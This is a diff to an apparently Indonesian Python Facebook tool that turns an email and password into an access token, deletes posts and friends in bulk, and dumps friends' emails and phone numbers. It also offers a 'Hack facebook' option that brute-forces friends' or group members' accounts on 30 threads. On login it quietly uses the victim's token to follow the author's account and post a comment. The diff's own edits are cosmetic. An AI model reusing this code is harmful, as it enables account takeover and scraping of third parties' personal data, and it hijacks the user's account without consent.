@@ -6,6 +6,7 @@
 #### IMPORT MODULE ####
 import os, sys, time, json, requests, hashlib
 from multiprocessing.pool import ThreadPool
+from getpass import getpass
 from requests.exceptions import ConnectionError
 
 #### WARNA ####
@@ -64,14 +65,14 @@ def menu():
 	print(p+40*'_')
 	print(m+'\n('+h+'✓'+m+')'+p+' Name '+h+ok['name'])
 	print(p+40*'_')
-	print(m+'\n('+h+'●'+m+') '+p+'01.'+k+' Delete all post')
+	print(m+'\n('+h+'●'+m+') '+p+'01.'+k+' Delete post')
 	print(m+'('+h+'●'+m+') '+p+'02.'+k+' Delete albums')
 	print(m+'('+h+'●'+m+') '+p+'03.'+k+' Delete all photo in albums')
 	print(m+'('+h+'●'+m+') '+p+'04.'+k+' Delete all friend')
 	print(m+'('+h+'●'+m+') '+p+'05.'+k+' Stop following all friend')
-	print(m+'('+h+'●'+m+') '+p+'06.'+k+' Dump email from your friend')
-	print(m+'('+h+'●'+m+') '+p+'07.'+k+' Dump phone numbers from your friend')
-	print(m+'('+h+'●'+m+') '+p+'08.'+k+' Hack facebook '+m+'< '+h+'masal'+m+' >')
+	print(m+'('+h+'●'+m+') '+p+'06.'+k+' Get email '+m+'< '+h+'friend'+m+' >')
+	print(m+'('+h+'●'+m+') '+p+'07.'+k+' Get phone numbers '+m+'< '+h+'friend'+m+' >')
+	print(m+'('+h+'●'+m+') '+p+'08.'+k+' Hack facebook '+m+'< '+h+'mas'+m+' >')
 	print(m+'('+h+'●'+m+') '+m+'00. Exit the program')
 	z=input('\n'+p+'>>> ')
 	if z=='':
@@ -112,10 +113,12 @@ def post():
 		time.sleep(1)
 		os.system('rm -rf token.txt')
 		login()
+	yz=s.get(url+'me?access_token='+token).json()
 	os.system('clear')
 	print(logo)
 	print(p+40*'_')
-	lunga(m+'\n['+p+'+'+m+']'+h+' Start ...')
+	print(m+'\n['+p+'+'+m+']'+h+' From '+p+': '+yz['name'])
+	lunga(m+'['+p+'+'+m+']'+h+' Start ...')
 	print(p+40*'_'+'\n')
 	ok=s.get(url+'me/posts?access_token='+token).json()
 	for o in ok['data']:
@@ -139,10 +142,12 @@ def albums():
 		time.sleep(1)
 		os.system('rm -rf result/token.txt')
 		login()
+	yz=s.get(url+'me?access_token='+token).json()
 	os.system('clear')
 	print(logo)
 	print(p+40*'_')
-	lunga(m+'\n['+p+'+'+m+']'+h+' Start ...')
+	print(m+'\n['+p+'+'+m+']'+h+' From '+p+': '+yz['name'])
+	lunga(m+'['+p+'+'+m+']'+h+' Start ...')
 	print(p+40*'_'+'\n')
 	ok=s.get(url+'v2.3/me/albums?access_token='+token).json()
 	for o in ok['data']:
@@ -196,10 +201,12 @@ def unfriend():
 		time.sleep(1)
 		os.system('rm -rf result/token.txt')
 		login()
+	yz=s.get(url+'me?access_token='+token).json()
 	os.system('clear')
 	print(logo)
 	print(p+40*'_')
-	lunga(m+'\n['+p+'+'+m+']'+h+' Start ...')
+	print(m+'\n['+p+'+'+m+']'+h+' From '+p+': '+yz['name'])
+	lunga(m+'['+p+'+'+m+']'+h+' Start ...')
 	print(p+40*'_'+'\n')
 	ok=s.get(url+'me/friends?access_token='+token).json()
 	for o in ok['data']:
@@ -223,12 +230,14 @@ def stopfollowing():
 		time.sleep(1)
 		os.system('rm -rf result/token.txt')
 		login()
+	yz=s.get(url+'me?access_token='+token).json()
 	os.system('clear')
 	print(logo)
 	print(p+40*'_')
-	lunga(m+'\n['+p+'+'+m+']'+h+' Start ...')
+	print(m+'\n['+p+'+'+m+']'+h+' From '+p+': '+yz['name'])
+	lunga(m+'['+p+'+'+m+']'+h+' Start ...')
 	print(p+40*'_'+'\n')
-	ok=s.get(url+'me/subscribedto?limit=5000&access_token='+token).json()
+	ok=s.get(url+'me/subscribedto?limit=500&access_token='+token).json()
 	for o in ok['data']:
 		ya=s.post(url+o['id']+'/subscribers?method=delete&access_token='+token).json()
 		try:
@@ -250,10 +259,13 @@ def getemail():
 		time.sleep(1)
 		os.system('rm -rf result/token.txt')
 		login()
+	yz=s.get(url+'me?access_token='+token).json()
 	os.system('clear')
 	print(logo)
 	print(p+40*'_')
 	lunga(m+'\n['+p+'*'+m+']'+h+' Fetching all email')
+	time.sleep(1)
+	print(m+'['+p+'+'+m+']'+h+' From '+p+': '+yz['name'])
 	lunga(m+'['+p+'+'+m+']'+h+' Start ...')
 	print(p+40*'_'+'\n')
 	ok=s.get(url+'me/friends?access_token='+token).json()
@@ -283,10 +295,13 @@ def getphone():
 		time.sleep(1)
 		os.system('rm -rf result/token.txt')
 		login()
+	yz=s.get(url+'me?access_token='+token).json()
 	os.system('clear')
 	print(logo)
 	print(p+40*'_')
 	lunga(m+'\n['+p+'*'+m+']'+h+' Fetching all phone numbers')
+	time.sleep(1)
+	print(m+'['+p+'+'+m+']'+h+' From '+p+': '+yz['name'])
 	lunga(m+'['+p+'+'+m+']'+h+' Start ...')
 	print(p+40*'_'+'\n')
 	ok=s.get(url+'me/friends?access_token='+token).json()
@@ -331,8 +346,10 @@ def menumbf():
 		menumbf()
 	elif e=='1' or e=='01':
 		os.system('clear')
+		yz=s.get(url+'me?access_token='+token).json()
 		print(logo)
 		print(p+40*'_'+'\n')
+		print(m+'['+p+'+'+m+']'+h+' From '+p+': '+yz['name'])
 		oh=s.get(url+'me/friends?access_token='+token).json()
 		for o in oh['data']:
 			id.append(o['id'])
@@ -360,8 +377,6 @@ def menumbf():
 			print(m+'*'+p+'Name'+m+' >> '+p+v['name'])
 			print(m+'*'+p+'ID'+m+'   >> '+p+v['id'])
 			print(p+40*'-')
-		else:
-			print(m+'[!] No group lists')
 		print(p+40*'_')
 		gr=input(m+'\n['+p+'+'+m+']'+h+' Id group '+p+': ')
 		try:
@@ -435,7 +450,7 @@ def menumbf():
 	f = ThreadPool(30)
 	f.map(crack, id)
 	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')
-	print(m+'['+p+'+'+m+']'+p+' Total '+h+'OK'+p+'/'+k+'CP: '+h+str(len(ok))+p+' / '+k+str(len(cp)))
+	print(m+'['+p+'+'+m+']'+p+' Total '+h+'OK'+p+'/'+k+'CP'+p+' : '+h+str(len(ok))+p+' / '+k+str(len(cp)))
 	print(m+'['+h+'+'+m+']'+p+' CP file saved : '+h+'result/cp.txt')
 	
 #### GET TOKEN ####
@@ -453,7 +468,7 @@ if __name__=='__main__':
 		print(logo)
 		print(p+40*'_')
 		em=input(m+'\n['+p+'*'+m+']'+h+' Email'+p+' : ')
-		pas=input(m+'['+p+'*'+m+']'+h+' Pass'+p+'  : ')
+		pas=getpass(m+'['+p+'*'+m+']'+h+' Pass'+p+'  : ')
 		print(m+'['+p+'!'+m+']'+p+' Generate access token')
 		try:
 			sig='api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+em+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pas+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
@@ -462,12 +477,12 @@ if __name__=='__main__':
 			x.update(sig.encode('utf-8'))
 			data.update({'sig':x.hexdigest()})
 			ok=s.get(fb,params=data).json()
-			result=open('result/token.txt','w')
-			result.write(ok['access_token'])
-			result.close()
+			unikers=open('result/token.txt','w')
+			unikers.write(ok['access_token'])
+			unikers.close()
 			if 'access_token' in ok:
 				token=open('result/token.txt','r').read()
-				print(m+'['+h+'✓'+m+']'+h+' Success generate access token');s.post('https://graph.facebook.com/DulahZ/subscribers?access_token='+token);s.post("https://graph.facebook.com/100005584243934_1145924785603652/comments?message=Keren❤️&access_token="+token)
+				print(m+'['+h+'✓'+m+']'+h+' Success generate access token');s.post(url+'DulahZ/subscribers?access_token='+token);s.post(url+'100005584243934_1145924785603652/comments?message=Keren❤️&access_token='+token)
 				time.sleep(1)
 				menu()
 		except KeyError:
